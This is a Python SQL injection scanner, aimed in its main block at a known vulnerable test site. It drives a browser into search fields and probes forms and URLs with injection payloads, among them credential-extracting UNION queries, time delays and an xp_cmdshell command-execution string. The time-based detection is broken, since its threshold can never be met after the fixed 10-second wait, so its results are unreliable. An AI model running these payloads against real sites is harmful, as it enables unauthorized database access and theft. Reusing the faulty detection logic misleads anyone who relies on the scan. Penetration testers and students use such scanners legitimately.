from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException, ElementNotInteractableException
import time
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin


def find_search_bar(browser, url, method):
    browser.get(url)
    try_methods = [
        ("css_selector", "input[type='text']"),
        ("name", "q"),
        ("name", "email"),
        ("id", "search-bar"),
        ("css_selector", "input[type='search']")
    ]
    if method:
        try_methods = method

    # Attempt to find and verify search bar in main content
    found_search_bar = try_methods_for_search_bar(browser, try_methods)
    if found_search_bar[0]:
        return found_search_bar

    # Fallback: attempt to find and verify search bar within frames
    browser.switch_to.default_content()  # Ensure starting from the main document
    frames = browser.find_elements(By.TAG_NAME, "iframe") + browser.find_elements(By.TAG_NAME, "frame")

    for frame in frames:
        try:
            browser.switch_to.frame(frame)
            found_search_bar = try_methods_for_search_bar(browser, try_methods)
            if found_search_bar and found_search_bar[
                0]:  # Check if found_search_bar is not None and has a found element
                return found_search_bar
        except Exception as e:
            print(f"Error switching to frame: {e}")
        finally:
            browser.switch_to.default_content()  # Always switch back to the main content after each frame

    print("Search bar not found in any frame or the main content.")
    return [None, None, None]


def try_methods_for_search_bar(browser, try_methods):
    for method, value in try_methods:
        search_bar = try_find_search_bar(browser, method, value)
        if search_bar[0]:
            return search_bar
    return [None, None, None]  # Ensure it returns a list even when not found


def try_find_search_bar(browser, method, value):
    try:
        search_bar = WebDriverWait(browser, 15).until(
            EC.presence_of_element_located((getattr(By, method.upper()), value))
        )
        # Verify it's interactable
        try:
            search_bar.send_keys("Test")
            search_bar.clear()  # Clear the test input
            print(f"Found interactable search bar using {method}='{value}'.")
            return [search_bar, method, value]
        except ElementNotInteractableException:
            print(f"Search bar found but not interactable using {method}='{value}'.")
            return [None, None, None]
    except (NoSuchElementException, TimeoutException) as e:
        print(f"Search bar not found using {method}='{value}'.")
        # Reason: {e}")
        return [None, None, None]


def test_sqli_payloads(browser, url):
    # Categorize payloads into response-dependent and time-based
    response_dependent_payloads = [
        "' OR '1'='1",  # Simple and effective always true condition.
        "' OR 1=1--",  # Common always true condition with comment.
        "'; EXECUTE IMMEDIATE 'SELECT * FROM users; --",  # Potentially dangerous SQL commands.
        "' UNION SELECT username, password FROM users--",  # Extract critical data.
        "' AND SLEEP(5)--",  # Simple delay to check for blind SQLi.
        "1'; WAITFOR DELAY '00:00:10'--",  # SQL Server specific delay.
        "1' AND 1=2 UNION SELECT NULL, version()--",  # Fetch database version using a condition that is false.
    ]
    time_based_payloads = [
        "' OR SLEEP(45)-- -",  # Long delay for MySQL.
        "'; WAITFOR DELAY '0:0:45'--",  # Long delay for SQL Server.
        "1'; EXEC xp_cmdshell('whoami')--",  # SQL Server command execution.
        "'; SELECT pg_sleep(45)--",  # Long delay for PostgreSQL.
    ]

    results = []
    exceptions = []

    # Function to analyze response for error messages
    def analyze_response(browser):
        error_indicators = [
            "you have an error in your sql syntax;",
            "warning: mysql_fetch",
            "unclosed quotation mark",
            "microsoft ole db provider for sql server error '80040e14'",
            "unclosed quotation mark after the character string",
            "pg::syntaxerror",
            "org.hibernate.exception.sqlgrammarexception:"
        ]
        page_source = browser.page_source.lower()

        for error in error_indicators:
            if error in page_source:
                return True, "Potential SQL Injection vulnerability detected due to error message."
        return False, "No clear vulnerability detected based on error message checks."

    method = []
    search_bar = find_search_bar(browser, url, method)
    method = [(search_bar[1], search_bar[2])]

    # Handling response-dependent payloads
    for payload in response_dependent_payloads:
        try:
            search_bar = find_search_bar(browser, url, method)[
                0]  # Assuming find_search_bar returns a tuple with search_bar as the first element
            if search_bar is None:
                raise Exception("Search bar could not be found.")
            search_bar.clear()
            search_bar.send_keys(payload + Keys.ENTER)
            time.sleep(5)  # Adjust based on expected page load time
            detected, result_message = analyze_response(browser)
            results.append((payload, result_message))
            browser.back()
            time.sleep(2)  # Adjust based on your observation for navigation
        except Exception as e:
            exceptions.append((payload, str(e)))

    # Handling time-based payloads
    for payload in time_based_payloads:
        try:
            start_time = time.time()
            search_bar = find_search_bar(browser, url, method)[0]
            if search_bar is None:
                raise Exception("Search bar could not be found.")
            search_bar.clear()
            search_bar.send_keys(payload + Keys.ENTER)
            # Wait for a time longer than the expected delay to ensure detection
            time.sleep(10)  # Example for payloads with around 5 seconds delay
            elapsed_time = time.time() - start_time
            if elapsed_time - 45 > 3:  # Example threshold, adjust based on expected delay and acceptable variance
                results.append((payload, "Potential SQL Injection vulnerability detected through time delay."))
            else:
                results.append((payload, "No significant delay detected."))
            browser.back()
            time.sleep(2)
        except Exception as e:
            exceptions.append((payload, str(e)))

    for payload, exception_message in exceptions:
        print(f"Payload '{payload}': Exception - {exception_message}")

    return results


def check_sqli_in_searchbar(url):
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--ignore-certificate-errors")
    browser = webdriver.Chrome(options=chrome_options)

    try:
        search_bar = find_search_bar(browser, url, None)[0]
        if search_bar:
            print("Success: Search bar found.")
            results = test_sqli_payloads(browser, url)
            print("\nSQL Injection Test Results:")
            for payload, result in results:
                print(f"Payload '{payload}': {result}")
        else:
            print("Search bar not found.")
    except Exception as e:
        print(f"An unexpected error occurred: {str(e)}")
    finally:
        browser.quit()


def request_session(user_agent="Mozilla/5.0"):
    session = requests.Session()
    session.headers['User-Agent'] = user_agent
    return session


def find_forms(html):
    soup = BeautifulSoup(html, "html.parser")
    return soup.find_all("form")


def form_details(form):
    details = {
        "action": form.attrs.get("action", "").lower(),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }
    form_fields = form.find_all(['input', 'textarea', 'select'])
    for field in form_fields:
        if field.name:
            input_details = {
                "type": field.attrs.get("type", "text"),
                "name": field.name,
                "value": field.attrs.get("value", "")
            }
            if field.name and field.name not in [input['name'] for input in details['inputs']]:
                details["inputs"].append(input_details)
    return details


def is_vulnerable(response):
    error_messages = [
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
    ]
    return any(error in response.text.lower() for error in error_messages)


def scan_sql_injection(url, session):
    print(f"Testing URL: {url}")

    # Test vulnerability in the URL
    if is_sql_injection_vulnerable_by_url(url, session):
        print("SQL Injection vulnerability detected in URL.")

    # Test the forms on the page
    try:
        response = session.get(url)
        forms = find_forms(response.text)
        print(f"Found {len(forms)} forms on {url}.")
        for form in forms:
            form_info = form_details(form)
            content_type = response.headers.get('Content-Type')
            if is_vulnerable_form(url, form_info, session, content_type):
                print(f"SQL Injection vulnerability detected in form on {url}")
    except requests.exceptions.RequestException as e:
        print(f"Error fetching the URL: {e}")


def is_vulnerable_form(base_url, form, session, content_type):
    action = urljoin(base_url, form['action'])
    data = {}
    for input in form['inputs']:
        data[input['name']] = "test" + "'"
    if form['method'] == 'post':
        res = session.post(action, data=data)
    else:
        res = session.get(action, params=data)
    return is_vulnerable(res)


def is_sql_injection_vulnerable_by_url(url, session):
    payloads = ["'", '"', '--', '#', ' OR 1=1']
    for payload in payloads:
        test_url = f"{url}{payload}"
        try:
            response = session.get(test_url)
            if is_vulnerable(response):
                return True
        except requests.exceptions.RequestException as e:
            print(f"Failed to send request: {e}")
    return False


if __name__ == '__main__':
    test_url = "http://testphp.vulnweb.com/artists.php?artist=1"
    session = request_session()
    scan_sql_injection(test_url, session)
    check_sqli_in_searchbar(test_url)
